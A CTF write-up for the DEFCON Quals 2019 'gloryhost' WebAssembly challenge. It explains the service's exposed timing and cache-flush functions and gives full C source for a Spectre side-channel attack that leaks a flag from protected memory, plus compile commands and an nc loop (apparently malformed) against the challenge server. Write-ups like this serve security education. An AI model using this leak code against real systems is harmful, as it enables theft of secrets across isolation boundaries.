---
layout: post
title: DEFCON Quals 2019, Gloryhost
date:   2019-05-13 18:43:49 -0400
categories: ctf defcon quals
comments: true
---

<img src="/assets/gloryhost.jpg">

Author: mattypiper

Contributors: mattypiper, fringe

## Description

gloryhost is a 64-bit Linux ELF network service written in Rust. It accepts compiled WebAssembly programs on port 9999
and executes the wasm program in a seccomp filtered sandbox. After figuring out how to generate a wasm program written in
C using wasi-sdk, we were able to load our code into the service using base64. The service then responds with an error message expecting
a certain export that was not found:

> your code makes me feel funny: unable to resolve entry point: Export not found: this_is_what_ive_got

Defining this function in C and setting it as the entry point allows the code to execute.

```c
int this_is_what_ive_got()
{
    return 0;
}
```

```bash
/opt/wasi-sdk/bin/clang -o test.wasm -Wl,-e,this_is_what_ive_got test.c
```

Gloryhost appears to print the return value of your function and execute the C code.
Attempting to execute libc functions such as `open()` and `read()`
results in the service dying prematurely with a trap:

> your code makes me feel funny: unable to execute entry point: WebAssembly trap occured during runtime: unknown

The service disables syscalls with seccomp, hence the WebAssembly trap. At this point we discovered a set of functions in the
gloryhost namespace that were interesting.

1. `wasi_debug_flush` executes the x86 clflush instruction on the pointer argument
1. `wasi_check_data`, `wasi_get_data_size` and the`wasi_get_data*` functions were recognized as a set of functions that implement
a few of the "primitives" required to execute the [Spectre](https://spectreattack.com/spectre.pdf) attack (speculative execution cache side channel).
1. `wasi_debug_read` performs a C-style read of the pointer argument, required for Spectre.
1. `wasi_debug_ts` executes the x86 `rdtsc` instruction, a timing instrument that can be used to execute the Spectre attack.

Inspection with strace and gdb revealed that the challenge flag was being loaded into the .bss entry `_data6` at 0xe86120.
This memory is inaccessible using the `wasi_get_data` functions, as they were only provided for memory areas data2 thru data5.

At this point, we laid out the plan: Call the `gloryhost::wasi` functions from our C code in a Spectre-style attack
to read the flag from memory.

To call the external code, we had to define the functions as `extern` and use the linker directive 
`-Wl,--allow-undefined` to avoid link errors. Getting the function arguments and return values to line up
was aided by the dynamic WebAssembly linker built into gloryhost, which printed helpful messages such as:

> your code makes me feel funny: unable to resolve entry point: Parameters of type [] did not match signature [I32] -> [I32]

For getting the flag itself, the only instrument provided to send data back to the client was via the 32-bit return value
of the `this_is_what_ive_got` function. For example, returning 0xdeadbeef from `this_is_what_ive_got` would print:

> YOU'VE GOT deadbeef

We based our Spectre implementation on an
[existing Spectre PoC from ErikAugust](https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6).

As we implemented the Spectre attack, we had to take care to avoid using pointers or array indexing. This was because
the wasi-sdk only supported 32-bit mode. So we wrote the function prototypes replacing pointers with uint64_t, as follows:

```c
extern int64_t debug_ts();  // rdtsc
extern void debug_flush(uint64_t);  // clflush
extern void debug_read(uint64_t);
extern void check_data(int32_t);  // "victim function"
extern uint64_t get_data_size();
extern uint64_t get_data5();
```

And after some more thought, we realized that direct pointer/array accesses would not even work as expected
when crossing the boundary from WebAssembly to C/amd64.

Anyway, after tuning the cache timing threshold, we were able to read the flag one byte at a time (we kept
the code from the PoC that also generated a score and put that in the return value as well to be able to gauge
the confidence of each flag byte).

## Solution

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

extern int64_t debug_ts();  // rdtsc
extern void debug_flush(uint64_t);  // clflush
extern void debug_read(uint64_t);
extern void check_data(int32_t);  // "victim function"
extern uint64_t get_data_size();
extern uint64_t get_data5();

#define CACHE_HIT_THRESHOLD (600) /* assume cache hit if time <= threshold */

/* aliases from github poc to gloryhost:
     array2 = get_data5()
     array1_size = get_data_size()
     victim_function = check_data()
     array1 = get_data3()
     flag is in _data6  */

void readMemoryByte(uint32_t malicious_x, uint8_t value[2], int score[2])
{
    int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    uint64_t time1, time2;
    size_t training_x, x;
    volatile uint8_t* addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;

    for (tries = 999; tries > 0; tries--) {
        // flush data5 from cache
        for (int i = 0; i < 256; i++) {
            uint64_t p = get_data5();
            p += i*512;
            debug_flush(p);
        }

        // 30 loops, 5 training runs per attack
        training_x = tries % 16; // 16 == nelements(array1_size)
        for (j = 29; j >= 0; j--) {
            debug_flush(get_data_size());

            // delay
            for (volatile int z = 0; z < 100; z++);

            // bit twiddling
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            check_data(x);
        }

        // time reads
        for (int i = 0; i < 256; ++i) {
            mix_i = ((i * 167) + 13) & 255;

            uint64_t addr  = get_data5();
            addr += mix_i * 512;
            time1 = debug_ts();
            debug_read(addr);
            time2 = debug_ts() - time1;
            if (time2 <= CACHE_HIT_THRESHOLD)
                results[mix_i]++;
        }

        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int this_is_what_ive_got()
{
    uint32_t malicious_x = 0x100 + MALOFFSET; // use compiler argument to "step" this index
    int score[2], len = 2;
    uint8_t value[2];
    readMemoryByte(malicious_x, value, score);
    return (value[0] << 24) | (value[1] << 16) | ((score[0] & 0xff)<<8) | (score[1] & 0xff);
}

int main() {}
```

Compile with:

```sh
/opt/wasi-sdk/bin/clang -DMALOFFSET=1 -Ofast -o solve.wasm \
    -Wl,-e,this_is_what_ive_got -Wl,--allow-undefined solve.c
```

Leak one byte at a time with a script:
```sh
for i in `seq 0 40`; do \
    nc -N gloryhost.quals2019.oooverflow.io 9999; done | \
    /opt/wasi-sdk/bin/clang -DMALOFFSET=$i -Ofast -o solve.wasm \
    -Wl,-e,this_is_what_ive_got -Wl,--allow-undefined solve.c && \
    cat solve.wasm | base64 -w0 | nc -N localhost 9999 | egrep '^YOU' | cut -d' ' -f3 | cut -c1-2| xxd -r -p; \
    done
```
